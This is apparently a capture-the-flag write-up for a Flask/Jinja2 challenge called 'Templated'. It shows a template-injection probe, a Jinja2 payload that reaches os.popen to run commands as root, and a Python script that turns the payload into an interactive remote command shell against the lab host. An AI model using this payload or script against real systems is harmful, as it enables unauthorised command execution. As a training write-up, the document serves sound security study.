# Templated

The application is running in Flask and Jinja2. Thus I can try the following command like in this link : https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

```
http://143.110.162.231:31790/{{1+1}}
```

It returns the result `2`.

Then I can search to find how to call a method that execute command line. I found a link : https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/

```bash
http://143.110.162.231:31790/{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

This request returns me the user `root`. I craft an application in Python.

```python
import requests

cmd = input("Command : ")
url = "http://143.110.162.231:31790/{{request.application.__globals__.__builtins__.__import__('os').popen('" + cmd + "').read()}}"
headers = {
    "Host": "143.110.162.231:31790",
	"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
	"Accept-Language": "en-US,en;q=0.5",
	"Accept-Encoding": "gzip, deflate",
	"Connection": "keep-alive",
	"Upgrade-Insecure-Requests": "1",
}

response = requests.get(url, headers=headers)
try:
	response = response.text.split("<str>")[1].split("</str>")[0]
	print(response)
except IndexError:
    pass
```

Then I can execute it to grab the flag.

```bash
python script.py
```
